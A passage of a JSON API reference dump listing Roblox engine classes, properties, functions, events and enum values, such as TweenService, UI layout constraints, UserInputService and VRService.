ype":"Class","Name":"TouchInputService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"TouchTransmitter","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"Trail","tags":[]},{"ValueType":"Object","type":"Property","Name":"Attachment0","tags":[],"Class":"Trail"},{"ValueType":"Object","type":"Property","Name":"Attachment1","tags":[],"Class":"Trail"},{"ValueType":"ColorSequence","type":"Property","Name":"Color","tags":[],"Class":"Trail"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Trail"},{"ValueType":"bool","type":"Property","Name":"FaceCamera","tags":[],"Class":"Trail"},{"ValueType":"float","type":"Property","Name":"Lifetime","tags":[],"Class":"Trail"},{"ValueType":"float","type":"Property","Name":"LightEmission","tags":[],"Class":"Trail"},{"ValueType":"float","type":"Property","Name":"MinLength","tags":[],"Class":"Trail"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"Trail"},{"ValueType":"float","type":"Property","Name":"TextureLength","tags":[],"Class":"Trail"},{"ValueType":"TextureMode","type":"Property","Name":"TextureMode","tags":[],"Class":"Trail"},{"ValueType":"NumberSequence","type":"Property","Name":"Transparency","tags":[],"Class":"Trail"},{"ReturnType":"void","Arguments":[],"Name":"Clear","tags":[],"Class":"Trail","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TweenBase","tags":["notbrowsable"]},{"ValueType":"PlaybackState","type":"Property","Name":"PlaybackState","tags":["readonly"],"Class":"TweenBase"},{"ReturnType":"void","Arguments":[],"Name":"Cancel","tags":[],"Class":"TweenBase","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":[],"Class":"TweenBase","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Play","tags":[],"Class":"TweenBase","type":"Function"},{"Arguments":[{"Name":"playbackState","Type":"PlaybackState"}],"Name":"Completed","tags":[],"Class":"TweenBase","type":"Event"},{"Superclass":"TweenBase","type":"Class","Name":"Tween","tags":[]},{"ValueType":"Object","type":"Property","Name":"Instance","tags":["readonly"],"Class":"Tween"},{"ValueType":"TweenInfo","type":"Property","Name":"TweenInfo","tags":["readonly"],"Class":"Tween"},{"Superclass":"Instance","type":"Class","Name":"TweenService","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"instance","Default":null},{"Type":"TweenInfo","Name":"tweenInfo","Default":null},{"Type":"Dictionary","Name":"propertyTable","Default":null}],"Name":"Create","tags":[],"Class":"TweenService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"UIBase","tags":[]},{"Superclass":"UIBase","type":"Class","Name":"UIComponent","tags":[]},{"Superclass":"UIComponent","type":"Class","Name":"UIConstraint","tags":[]},{"Superclass":"UIConstraint","type":"Class","Name":"UIAspectRatioConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"AspectRatio","tags":[],"Class":"UIAspectRatioConstraint"},{"ValueType":"AspectType","type":"Property","Name":"AspectType","tags":[],"Class":"UIAspectRatioConstraint"},{"ValueType":"DominantAxis","type":"Property","Name":"DominantAxis","tags":[],"Class":"UIAspectRatioConstraint"},{"Superclass":"UIConstraint","type":"Class","Name":"UISizeConstraint","tags":[]},{"ValueType":"Vector2","type":"Property","Name":"MaxSize","tags":[],"Class":"UISizeConstraint"},{"ValueType":"Vector2","type":"Property","Name":"MinSize","tags":[],"Class":"UISizeConstraint"},{"Superclass":"UIConstraint","type":"Class","Name":"UITextSizeConstraint","tags":[]},{"ValueType":"int","type":"Property","Name":"MaxTextSize","tags":[],"Class":"UITextSizeConstraint"},{"ValueType":"int","type":"Property","Name":"MinTextSize","tags":[],"Class":"UITextSizeConstraint"},{"Superclass":"UIComponent","type":"Class","Name":"UILayout","tags":[]},{"Superclass":"UILayout","type":"Class","Name":"UIGridStyleLayout","tags":["notbrowsable"]},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteContentSize","tags":["readonly"],"Class":"UIGridStyleLayout"},{"ValueType":"FillDirection","type":"Property","Name":"FillDirection","tags":[],"Class":"UIGridStyleLayout"},{"ValueType":"HorizontalAlignment","type":"Property","Name":"HorizontalAlignment","tags":[],"Class":"UIGridStyleLayout"},{"ValueType":"SortOrder","type":"Property","Name":"SortOrder","tags":[],"Class":"UIGridStyleLayout"},{"ValueType":"VerticalAlignment","type":"Property","Name":"VerticalAlignment","tags":[],"Class":"UIGridStyleLayout"},{"ReturnType":"void","Arguments":[],"Name":"ApplyLayout","tags":[],"Class":"UIGridStyleLayout","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Function","Name":"function","Default":"nil"}],"Name":"SetCustomSortFunction","tags":["deprecated"],"Class":"UIGridStyleLayout","type":"Function"},{"Superclass":"UIGridStyleLayout","type":"Class","Name":"UIGridLayout","tags":[]},{"ValueType":"UDim2","type":"Property","Name":"CellPadding","tags":[],"Class":"UIGridLayout"},{"ValueType":"UDim2","type":"Property","Name":"CellSize","tags":[],"Class":"UIGridLayout"},{"ValueType":"int","type":"Property","Name":"FillDirectionMaxCells","tags":[],"Class":"UIGridLayout"},{"ValueType":"StartCorner","type":"Property","Name":"StartCorner","tags":[],"Class":"UIGridLayout"},{"Superclass":"UIGridStyleLayout","type":"Class","Name":"UIListLayout","tags":[]},{"ValueType":"UDim","type":"Property","Name":"Padding","tags":[],"Class":"UIListLayout"},{"Superclass":"UIGridStyleLayout","type":"Class","Name":"UIPageLayout","tags":[]},{"ValueType":"bool","type":"Property","Name":"Animated","tags":[],"Class":"UIPageLayout"},{"ValueType":"bool","type":"Property","Name":"Circular","tags":[],"Class":"UIPageLayout"},{"ValueType":"Object","type":"Property","Name":"CurrentPage","tags":["readonly"],"Class":"UIPageLayout"},{"ValueType":"EasingDirection","type":"Property","Name":"EasingDirection","tags":[],"Class":"UIPageLayout"},{"ValueType":"EasingStyle","type":"Property","Name":"EasingStyle","tags":[],"Class":"UIPageLayout"},{"ValueType":"bool","type":"Property","Name":"GamepadInputEnabled","tags":[],"Class":"UIPageLayout"},{"ValueType":"UDim","type":"Property","Name":"Padding","tags":[],"Class":"UIPageLayout"},{"ValueType":"bool","type":"Property","Name":"ScrollWheelInputEnabled","tags":[],"Class":"UIPageLayout"},{"ValueType":"bool","type":"Property","Name":"TouchInputEnabled","tags":[],"Class":"UIPageLayout"},{"ValueType":"float","type":"Property","Name":"TweenTime","tags":[],"Class":"UIPageLayout"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"page","Default":null}],"Name":"JumpTo","tags":[],"Class":"UIPageLayout","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"index","Default":null}],"Name":"JumpToIndex","tags":[],"Class":"UIPageLayout","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Next","tags":[],"Class":"UIPageLayout","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Previous","tags":[],"Class":"UIPageLayout","type":"Function"},{"Arguments":[{"Name":"page","Type":"Instance"}],"Name":"PageEnter","tags":[],"Class":"UIPageLayout","type":"Event"},{"Arguments":[{"Name":"page","Type":"Instance"}],"Name":"PageLeave","tags":[],"Class":"UIPageLayout","type":"Event"},{"Arguments":[{"Name":"currentPage","Type":"Instance"}],"Name":"Stopped","tags":[],"Class":"UIPageLayout","type":"Event"},{"Superclass":"UIGridStyleLayout","type":"Class","Name":"UITableLayout","tags":[]},{"ValueType":"bool","type":"Property","Name":"FillEmptySpaceColumns","tags":[],"Class":"UITableLayout"},{"ValueType":"bool","type":"Property","Name":"FillEmptySpaceRows","tags":[],"Class":"UITableLayout"},{"ValueType":"TableMajorAxis","type":"Property","Name":"MajorAxis","tags":[],"Class":"UITableLayout"},{"ValueType":"UDim2","type":"Property","Name":"Padding","tags":[],"Class":"UITableLayout"},{"Superclass":"UIComponent","type":"Class","Name":"UIPadding","tags":[]},{"ValueType":"UDim","type":"Property","Name":"PaddingBottom","tags":[],"Class":"UIPadding"},{"ValueType":"UDim","type":"Property","Name":"PaddingLeft","tags":[],"Class":"UIPadding"},{"ValueType":"UDim","type":"Property","Name":"PaddingRight","tags":[],"Class":"UIPadding"},{"ValueType":"UDim","type":"Property","Name":"PaddingTop","tags":[],"Class":"UIPadding"},{"Superclass":"UIComponent","type":"Class","Name":"UIScale","tags":[]},{"ValueType":"float","type":"Property","Name":"Scale","tags":[],"Class":"UIScale"},{"Superclass":"Instance","type":"Class","Name":"UserGameSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllTutorialsDisabled","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"CustomCameraMode","type":"Property","Name":"CameraMode","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"CameraYInverted","tags":["RobloxScriptSecurity","hidden"],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"ChatVisible","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"ComputerCameraMovementMode","type":"Property","Name":"ComputerCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ComputerMovementMode","type":"Property","Name":"ComputerMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ControlMode","type":"Property","Name":"ControlMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"Fullscreen","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"GamepadCameraSensitivity","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"HasEverUsedVR","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"IsUsingCameraYInverted","tags":["RobloxScriptSecurity","hidden","readonly"],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"IsUsingGamepadCameraSensitivity","tags":["RobloxScriptSecurity","hidden","readonly"],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MasterVolume","tags":[],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MouseSensitivity","tags":[],"Class":"UserGameSettings"},{"ValueType":"Vector2","type":"Property","Name":"MouseSensitivityFirstPerson","tags":["RobloxScriptSecurity","hidden"],"Class":"UserGameSettings"},{"ValueType":"Vector2","type":"Property","Name":"MouseSensitivityThirdPerson","tags":["RobloxScriptSecurity","hidden"],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"PerformanceStatsVisible","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"RotationType","type":"Property","Name":"RotationType","tags":[],"Class":"UserGameSettings"},{"ValueType":"SavedQualitySetting","type":"Property","Name":"SavedQualityLevel","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchCameraMovementMode","type":"Property","Name":"TouchCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchMovementMode","type":"Property","Name":"TouchMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"UsedCoreGuiIsVisibleToggle","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"UsedCustomGuiIsVisibleToggle","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"UsedHideHudShortcut","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"VREnabled","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"int","type":"Property","Name":"VRRotationIntensity","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ReturnType":"int","Arguments":[],"Name":"GetCameraYInvertValue","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"tutorialId","Default":null}],"Name":"GetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InFullScreen","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InStudioMode","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetCameraYInvertVisible","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetGamepadCameraSensitivityVisible","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"tutorialId","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"Arguments":[{"Name":"isFullscreen","Type":"bool"}],"Name":"FullscreenChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Arguments":[{"Name":"isPerformanceStatsVisible","Type":"bool"}],"Name":"PerformanceStatsVisibleChanged","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Event"},{"Arguments":[{"Name":"isStudioMode","Type":"bool"}],"Name":"StudioModeChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"UserInputService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AccelerometerEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"Vector2","type":"Property","Name":"BottomBarSize","tags":["RobloxScriptSecurity","readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GamepadEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GazeSelectionEnabled","tags":["RobloxScriptSecurity","hidden"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GyroscopeEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"KeyboardEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"ModalEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"MouseBehavior","type":"Property","Name":"MouseBehavior","tags":[],"Class":"UserInputService"},{"ValueType":"float","type":"Property","Name":"MouseDeltaSensitivity","tags":[],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseIconEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"Vector2","type":"Property","Name":"NavBarSize","tags":["RobloxScriptSecurity","readonly"],"Class":"UserInputService"},{"ValueType":"double","type":"Property","Name":"OnScreenKeyboardAnimationDuration","tags":["RobloxScriptSecurity","readonly"],"Class":"UserInputService"},{"ValueType":"Vector2","type":"Property","Name":"OnScreenKeyboardPosition","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"Vector2","type":"Property","Name":"OnScreenKeyboardSize","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"OnScreenKeyboardVisible","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"OverrideMouseIconBehavior","type":"Property","Name":"OverrideMouseIconBehavior","tags":["RobloxScriptSecurity"],"Class":"UserInputService"},{"ValueType":"Vector2","type":"Property","Name":"StatusBarSize","tags":["RobloxScriptSecurity","readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"TouchEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"CoordinateFrame","type":"Property","Name":"UserHeadCFrame","tags":["deprecated","readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"VREnabled","tags":["readonly"],"Class":"UserInputService"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null},{"Type":"KeyCode","Name":"gamepadKeyCode","Default":null}],"Name":"GamepadSupports","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetConnectedGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceAcceleration","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceGravity","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetDeviceRotation","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetFocusedTextBox","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadConnected","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadState","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetKeysPressed","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"UserInputType","Arguments":[],"Name":"GetLastInputType","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetMouseButtonsPressed","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Vector2","Arguments":[],"Name":"GetMouseDelta","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Vector2","Arguments":[],"Name":"GetMouseLocation","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetNavigationGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Platform","Arguments":[],"Name":"GetPlatform","tags":["RobloxScriptSecurity"],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetSupportedGamepadKeyCodes","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[{"Type":"UserCFrame","Name":"type","Default":null}],"Name":"GetUserCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"KeyCode","Name":"keyCode","Default":null}],"Name":"IsKeyDown","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"mouseButton","Default":null}],"Name":"IsMouseButtonPressed","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null}],"Name":"IsNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RecenterUserHeadCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"statusBarSize","Default":null},{"Type":"Vector2","Name":"navBarSize","Default":null},{"Type":"Vector2","Name":"bottomBarSize","Default":null}],"Name":"SendAppUISizes","tags":["RobloxScriptSecurity"],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"Arguments":[{"Name":"acceleration","Type":"Instance"}],"Name":"DeviceAccelerationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gravity","Type":"Instance"}],"Name":"DeviceGravityChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"rotation","Type":"Instance"},{"Name":"cframe","Type":"CoordinateFrame"}],"Name":"DeviceRotationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadConnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadDisconnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputBegan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"JumpRequest","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"lastInputType","Type":"UserInputType"}],"Name":"LastInputTypeChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxReleased","Type":"Instance"}],"Name":"TextBoxFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxFocused","Type":"Instance"}],"Name":"TextBoxFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchLongPress","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchMoved","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPinch","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchRotate","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchStarted","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchSwipe","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchTap","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"position","Type":"Vector2"},{"Name":"processedByUI","Type":"bool"}],"Name":"TouchTapInWorld","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"type","Type":"UserCFrame"},{"Name":"value","Type":"CoordinateFrame"}],"Name":"UserCFrameChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"VRService","tags":[]},{"ValueType":"UserCFrame","type":"Property","Name":"GuiInputUserCFrame","tags":[],"Class":"VRService"},{"ValueType":"string","type":"Property","Name":"VRDeviceName","tags":["RobloxScriptSecurity","readonly"],"Class":"VRService"},{"ValueType":"bool","type":"Property","Name":"VREnabled","tags":["readonly"],"Class":"VRService"},{"ReturnType":"VRTouchpadMode","Arguments":[{"Type":"VRTouchpad","Name":"pad","Default":null}],"Name":"GetTouchpadMode","tags":[],"Class":"VRService","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[{"Type":"UserCFrame","Name":"type","Default":null}],"Name":"GetUserCFrame","tags":[],"Class":"VRService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserCFrame","Name":"type","Default":null}],"Name":"GetUserCFrameEnabled","tags":[],"Class":"VRService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RecenterUserHeadCFrame","tags":[],"Class":"VRService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null},{"Type":"UserCFrame","Name":"inputUserCFrame","Default":null}],"Name":"RequestNavigation","tags":[],"Class":"VRService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"VRTouchpad","Name":"pad","Default":null},{"Type":"VRTouchpadMode","Name":"mode","Default":null}],"Name":"SetTouchpadMode","tags":[],"Class":"VRService","type":"Function"},{"Arguments":[{"Name":"cframe","Type":"CoordinateFrame"},{"Name":"inputUserCFrame","Type":"UserCFrame"}],"Name":"NavigationRequested","tags":[],"Class":"VRService","type":"Event"},{"Arguments":[{"Name":"pad","Type":"VRTouchpad"},{"Name":"mode","Type":"VRTouchpadMode"}],"Name":"TouchpadModeChanged","tags":[],"Class":"VRService","type":"Event"},{"Arguments":[{"Name":"type","Type":"UserCFrame"},{"Name":"value","Type":"CoordinateFrame"}],"Name":"UserCFrameChanged","tags":[],"Class":"VRService","type":"Event"},{"Arguments":[{"Name":"type","Type":"UserCFrame"},{"Name":"enabled","Type":"bool"}],"Name":"UserCFrameEnabled","tags":[],"Class":"VRService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Vector3Value","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Value","tags":[],"Class":"Vector3Value"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"Changed","tags":[],"Class":"Vector3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"changed","tags":["deprecated"],"Class":"Vector3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"VirtualUser","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CaptureController","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton1","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton2","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"MoveMouse","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyDown","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyUp","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StartRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"StopRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"TypeKey","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Visit","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"WeldConstraint","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"WeldConstraint"},{"ValueType":"Object","type":"Property","Name":"Part0","tags":[],"Class":"WeldConstraint"},{"ValueType":"Object","type":"Property","Name":"Part1","tags":[],"Class":"WeldConstraint"},{"type":"Enum","Name":"AASamples","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":1,"Enum":"AASamples"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"AASamples"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"AASamples"},{"type":"Enum","Name":"AccessType","tags":[]},{"type":"EnumItem","Name":"Me","tags":[],"Value":0,"Enum":"AccessType"},{"type":"EnumItem","Name":"Friends","tags":[],"Value":1,"Enum":"AccessType"},{"type":"EnumItem","Name":"Everyone","tags":[],"Value":2,"Enum":"AccessType"},{"type":"EnumItem","Name":"InviteOnly","tags":[],"Value":3,"Enum":"AccessType"},{"type":"Enum","Name":"ActionType","tags":[]},{"type":"EnumItem","Name":"Nothing","tags":[],"Value":0,"Enum":"ActionType"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":1,"Enum":"ActionType"},{"type":"EnumItem","Name":"Lose","tags":[],"Value":2,"Enum":"ActionType"},{"type":"EnumItem","Name":"Draw","tags":[],"Value":3,"Enum":"ActionType"},{"type":"EnumItem","Name":"Win","tags":[],"Value":4,